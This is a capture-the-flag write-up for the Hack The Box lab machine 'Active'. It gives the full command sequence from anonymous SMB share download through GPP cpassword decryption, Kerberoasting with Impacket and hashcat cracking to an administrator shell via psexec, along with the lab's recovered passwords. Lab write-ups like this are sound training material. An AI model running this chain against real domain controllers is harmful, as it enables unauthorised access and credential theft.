---
description: https://www.hackthebox.eu/home/machines
---

# Active

![](<../../../.gitbook/assets/image (381) (1).png>)

### Nmap

We start off with a basic initial scan on Nmap.

```
nmap 10.10.10.100 -p- -sS -T4 -sV

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-11-21 14:22:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49182/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

We find port 53 open and ports for LDAP and Kerberos open which means we are almost certainly dealing with a domain controller.

### Port 445 (SMB)

I started off checking SMB for any quick and easy wins by attempting to authenticate without credentials against the domain controller.

```
smbclient -N -L \\\\10.10.10.100 
```

![](<../../../.gitbook/assets/image (382).png>)

We can use `smbmap` to check what shares we have access to without credentials.

```
smbmap -H 10.10.10.100
```

![](<../../../.gitbook/assets/image (383).png>)

We have read access to the "Replication" share. We can run `smbget` against this recursively to download the entire share.

```
smbget -R -U "" smb://10.10.10.100/Replication
```

![](<../../../.gitbook/assets/image (385).png>)

### Group Policy

After downloading the share we can navigate to the downloaded folders on our attacking machine. When browsing through them the folder of interest is the 'Policies' folder.

![](<../../../.gitbook/assets/image (386).png>)

When dealing with Group Policy folders the ideal information to gather would be a value called "cpassword' which is usually located in Groups.xml. Below is a great blog post regarding this.

{% embed url="https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/" %}

If you go to the following location "\_active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml" Y\_ou will see we have the following information contained in the XML file.

![](<../../../.gitbook/assets/image (387).png>)

### Password Decryption

We have a username of SVC\_TGS and a cpassword value.\_ \_Kali comes with a tool called `gpp-decrypt`. We can use this to decrypt the cpassword value into plain text.

```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

![](<../../../.gitbook/assets/image (388) (1).png>)

Password: GPPstillStandingStrong2k18

I Then tried to connect to WinRM on port 47001 with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) however, I had no luck with the credentials we have gained so far. We do have Kerberos on port 88 running so we have potential here to enumerate further credentials and accounts.

Before we do anything lets confirm if the credentials work on SMB. We can use `smbmap` to quickly see what we can now access.

```
smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100 -r 'Users'
```

![](<../../../.gitbook/assets/image (389).png>)

We can now run a recursive search with -R on `smbmap` to get a quick glance at any potential loot.

![](<../../../.gitbook/assets/image (390).png>)

We now have access to user.txt. Nothing else interesting here so we can check out Port 88 for some Kerberoasting since we have a valid domain account.

### Port 88 (Kerberos)

We can use Impacket's GetSPNusers.py script to gather any Kerberos tickets.

```
python GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```

![](<../../../.gitbook/assets/image (391).png>)

### Hash Cracking

We now have a hash for the Administrator account. I tried running the hash through John but, could not get John to recognize the format. Instead I moved over to `Hashcat` and run the hash type through the examples page to find the correct mode to run it against.

[https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example\_hashes)

![](<../../../.gitbook/assets/image (392).png>)

```
hashcat -m 13100 -a 0 /home/kali/Desktop/hash.txt /usr/share/wordlists/rockyou.txt 
```

`Hashcat` soon cracks the password as: `Ticketmaster1968`

### Shell as Administrator

Now we have valid credentials we can potentially gain further access in multiple ways. The first time I grabbed the flag using `smbclient` to access C$ however, if this was a real penetration test ideally we would demonstrate shell as system / administrator.

To gain shell I will use Impacket's psexec.py.

```
python psexec.py  active.htb/administrator:Ticketmaster1968@10.10.10.100
```

![](<../../../.gitbook/assets/image (393).png>)

From here we can loot both the root.txt and user.txt flags.
